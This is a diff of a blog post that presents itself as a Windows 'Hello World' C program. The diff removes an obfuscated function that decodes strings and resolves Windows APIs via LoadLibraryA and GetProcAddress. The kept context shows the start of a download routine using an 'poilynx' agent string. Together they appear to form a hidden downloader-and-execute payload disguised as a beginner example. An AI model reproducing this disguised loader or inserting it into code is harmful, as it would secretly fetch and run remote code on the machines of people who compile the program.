@@ -5,17 +5,7 @@ description: "一段Windows下的Hello World程序"
 ---
 {% highlight c %}
 #include <stdio.h>
-v _in(){
-    l sc LoadLibraryA(l);l sc GetProcAddress(l,l);
-    i=j=0;do*(__mp+ j++ +0x20)=i+0x20,i=(i+83)%(0x60);while(i!=0);
-    _ga =(F2)GetProcAddress,_ll=(F1)LoadLibraryA;kl=_ll((_dc(bf,__st[0]),rl(bf)));
-    nl=_ll((_dc(bf,__st[1]),rl(bf)));sl=_ll((_dc(bf,__st[2]),rl(bf)));
-    _no=(F5)_ga(nl,(_dc(bf,__st[3]),rl(bf)));_nr=(F4)_ga(nl,(_dc(bf,__st[4]),rl(bf)));
-    _nu=(F6)_ga(nl,(_dc(bf,__st[5]),rl(bf)));_nc=(F1)_ga(nl,(_dc(bf,__st[6]),rl(bf)));
-    _fn=(F7)_ga(kl,(_dc(bf,__st[7]),rl(bf)));_fw=(F5)_ga(kl,(_dc(bf,__st[8]),rl(bf)));
-    _fc=(F1)_ga(kl,(_dc(bf,__st[9]),rl(bf)));_cf=(F3)_ga(kl,(_dc(bf,__st[10]),rl(bf)));
-    _tp=(F2)_ga(kl,(_dc(bf,__st[11]),rl(bf)));_sh=(F6)_ga(sl,(_dc(bf,__st[12]),rl(bf)));
-}
+
 l _dl(l u){
     l cn,sn,f,rr,ln=0;
     sn=_no((l)"poilynx",1,0,0,0);if(!sn)return 0;
